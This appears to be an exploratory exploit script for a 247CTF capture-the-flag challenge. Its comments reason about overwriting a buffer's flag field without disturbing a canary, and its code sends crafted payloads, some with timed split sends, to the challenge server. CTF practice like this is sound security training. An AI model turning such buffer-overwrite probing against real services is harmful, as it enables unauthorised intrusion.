#!/usr/bin/env python3
from pwn import *
import time
import socket

context.log_level = 'error'

# The REAL insight: read() returns available data, not necessarily all 56 bytes
# If we carefully time our sends, we might get read() to return BEFORE we send all data

# But the server blocks on read() until SOME data arrives, then returns
# whatever is in the kernel buffer at that moment

# Key experiment: What if we send data in two TCP segments with a delay
# long enough that the server's read() returns between them?

# Actually, let's think about this differently:
# The canary is at [32:48], flag at [48:56]
# We need to preserve [32:48] AND write to [48:56]

# What if we DON'T SEND ANY DATA at all?
# read() would block forever... unless we close the connection
# If we close with no data, read() returns 0 (EOF)
# buffer stays as: [0:32]=0, [32:48]=canary, [48:56]=0
# check_canary passes, check_flag fails

# Wait! What if buffer[48:56] somehow already contains "247CTF:)"?
# Could there be residual data from somewhere?

# Let me check: calloc zeros memory, memset zeros it again
# So no, buffer[48:56] will always be zeros before read()

# Another idea: What if we can make the check_flag pass with zeros?
# No, it explicitly checks for "247CTF:)"

# Final idea: Is there a way to brute-force this?
# If we could try 2^128 canary values... no, that's impossible

# BUT: What if the RC4 implementation has a vulnerability where
# after N iterations, it produces a specific pattern?

# Let me try running many iterations and see if canary becomes predictable
# If canary ever becomes all zeros, we could exploit that

# Actually, the simplest approach might be:
# Send 32 bytes of padding (don't overwrite canary)
# But we NEED to write "247CTF:)" at [48:56]

# The ONLY way is if read() can somehow skip bytes... which it can't

# UNLESS: We're not thinking about this correctly
# What if we send bytes that, when combined with what's already in buffer,
# produce the desired result?

# Like, what if the memset doesn't actually zero the buffer, or there's a race?
# Unlikely, but let me test with very precise timing

for attempt in range(3):
    print(f"Attempt {attempt}")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    s.connect(('cfea9b365e987c70.247ctf.com', 50068))

    # Drain banner
    time.sleep(0.3)
    data = s.recv(4096)

    # Strategy: Send 32 bytes, wait, then send 8 bytes for flag string
    # But we need to also send 16 bytes for canary region
    # Let's try sending EXACTLY what we need: 32 + 16_zeros + "247CTF:)"

    payload = b'\x00' * 48 + b'247CTF:)'
    s.sendall(payload)

    time.sleep(0.3)
    response = s.recv(4096)
    if b'247CTF{' in response:
        print(f"FLAG: {response}")
        break
    s.close()

print("\n--- Different approach: multiple small sends ---")

for delay in [0.001, 0.01, 0.1, 0.5]:
    print(f"Trying delay={delay}")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    s.connect(('cfea9b365e987c70.247ctf.com', 50068))

    time.sleep(0.3)
    data = s.recv(4096)

    # Send first 32 bytes
    s.send(b'A' * 32)
    time.sleep(delay)

    # Server's read() might have returned by now
    # Send remaining data
    s.send(b'\x00' * 16 + b'247CTF:)')

    time.sleep(0.5)
    try:
        response = s.recv(4096)
        if b'247CTF{' in response:
            print(f"FLAG with delay={delay}: {response}")
            break
    except:
        pass
    s.close()
